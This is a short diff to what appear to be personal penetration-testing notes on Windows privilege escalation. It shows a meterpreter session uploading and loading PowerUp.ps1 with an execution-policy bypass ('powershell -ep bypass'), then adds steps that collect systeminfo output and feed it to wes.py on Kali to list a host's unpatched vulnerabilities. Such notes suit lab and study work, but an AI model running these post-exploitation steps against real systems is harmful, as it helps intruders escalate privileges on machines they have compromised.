@@ -8,4 +8,9 @@ meterpreter> upload home/beta/Download/PowerUp.Ps1 c:\\users\\user\\Download
 meterpreter> shell
 c:\users\user\Download>powershell        
 c:\users\user\Download>. ./PowerUp.ps1   ***Note:PS C:\> powershell -ep bypass and space between . ./PowerUp.ps1***
+>systeminfo
+**Copy the information and paste creating file (eg. sysinfo) in same folder where wes.py and definition.zip is stored in Kali linux**
+sudo ./wes.py sysinfo
+**** It will list all the vulnaberities that specific computer has based on the system inforemation that we generate******
+
 
